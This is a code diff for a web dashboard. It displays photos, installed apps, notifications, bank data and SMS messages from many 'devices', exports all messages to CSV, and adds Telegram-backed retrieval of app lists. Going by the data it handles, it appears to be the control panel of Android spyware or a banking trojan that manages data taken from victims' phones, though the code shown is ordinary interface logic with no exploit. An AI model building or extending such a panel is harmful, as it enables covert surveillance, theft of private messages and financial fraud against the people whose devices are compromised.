 document.getElementById('pClose').addEventListener('click', function() { document.getElementById('pViewer').classList.remove('active'); });
 document.getElementById('pDownload').addEventListener('click', function() {
   var p = photos[curPhoto]; if (!p) return;
+  var imgSrc = p.telegram_file_id ? telegramUrlCache[p.telegram_file_id] && telegramUrlCache[p.telegram_file_id].url : p.url;
+  if (p.telegram_file_id) {
+    telegramGetFileUrl(p.telegram_file_id).then(function(url) { window.open(url, '_blank'); });
+    return;
+  }
   if (p.url) { fetch(p.url).then(function(r) { return r.blob(); }).then(function(blob) { var a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = p.name || 'photo.jpg'; a.click(); }).catch(function() { window.open(p.url, '_blank'); }); }
   else if (p.base64) { var a = document.createElement('a'); a.href = p.base64; a.download = p.name || 'photo.jpg'; a.click(); }
 });
@@ -1042,22 +1071,35 @@ document.getElementById('pViewer').addEventListener('click', function(e) { if (e
 function renderApps() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
-  var appsData = d.installed_apps || {};
-  var url = appsData.url;
-  if (url) {
-    b.innerHTML = '<div class="loading">Loading apps...</div>';
-    fetch(url).then(function(r) { return r.json(); }).then(function(apps) {
-      document.getElementById('cApps').textContent = apps.length;
-      if (apps.length === 0) { b.innerHTML = '<div class="empty">No apps yet</div>'; return; }
+  var tg = d.installed_apps_telegram || {};
+  var fileId = tg.telegram_file_id;
+  if (fileId) {
+    b.innerHTML = '<div class="loading">Loading apps from Telegram...</div>';
+    document.getElementById('cApps').textContent = tg.count || '?';
+    telegramFetchJson(fileId).then(function(apps) {
+      if (!Array.isArray(apps) || apps.length === 0) { b.innerHTML = '<div class="empty">No apps</div>'; return; }
       apps.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
-      b.innerHTML = apps.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
-    }).catch(function(e) { b.innerHTML = '<div class="empty">Apps load failed: ' + e.message + '</div>'; });
+      b.innerHTML = '<div style="margin-bottom:10px;color:#64748B;font-size:10px;">📦 ' + apps.length + ' apps — ' + (tg.updated_at ? new Date(tg.updated_at).toLocaleString() : '') + '</div>' +
+        apps.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
+    }).catch(function(e) { b.innerHTML = '<div class="empty">Load failed: ' + e.message + '</div>'; });
   } else {
-    var l = Object.values(appsData).filter(function(x) { return x && x.name; });
-    l.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
-    document.getElementById('cApps').textContent = l.length;
-    if (l.length === 0) { b.innerHTML = '<div class="empty">No apps yet</div>'; return; }
-    b.innerHTML = l.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
+    var appsData = d.installed_apps || {};
+    var url = appsData.url;
+    if (url) {
+      b.innerHTML = '<div class="loading">Loading apps...</div>';
+      fetch(url).then(function(r) { return r.json(); }).then(function(apps) {
+        document.getElementById('cApps').textContent = apps.length;
+        if (apps.length === 0) { b.innerHTML = '<div class="empty">No apps yet</div>'; return; }
+        apps.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
+        b.innerHTML = apps.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
+      }).catch(function(e) { b.innerHTML = '<div class="empty">Apps load failed: ' + e.message + '</div>'; });
+    } else {
+      var l = Object.values(appsData).filter(function(x) { return x && x.name; });
+      l.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
+      document.getElementById('cApps').textContent = l.length;
+      if (l.length === 0) { b.innerHTML = '<div class="empty">No apps yet</div>'; return; }
+      b.innerHTML = l.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
+    }
   }
 }
 function renderNotifs() {
@@ -1093,7 +1135,7 @@ function renderBank() {
   b.innerHTML = html;
 }
 
-// ═══ TELEGRAM POLLING ═══
+// ═══ TELEGRAM POLLING (Send tab ka — alag system, ise mat chhedo) ═══
 function startTelegramPolling(token, chatId) {
   var devId = curId;
   if (!devId) return;
@@ -1368,6 +1410,7 @@ document.getElementById('delScopeCancel').addEventListener('click', closeFastDel
 document.getElementById('delScopeConfirm').addEventListener('click', confirmFastDelete);
 document.getElementById('delScopeOverlay').addEventListener('click', function(e) { if (e.target.id === 'delScopeOverlay') closeFastDeleteDialog(); });
 document.getElementById('delProgressClose').addEventListener('click', function() { document.getElementById('delProgressOverlay').classList.remove('active'); });
+document.getElementById('btnTelegram').addEventListener('click', openTelegramSettings);
 document.getElementById('btnCsv').addEventListener('click', function() {
   var csv = 'Device,Sender,Body,Date\n';
   Object.keys(devs).forEach(function(id) { var d = devs[id]; if (d.messages) Object.values(d.messages).forEach(function(m) { csv += '"' + id + '","' + (m.sender || '').replace(/"/g, '""') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n'; }); });
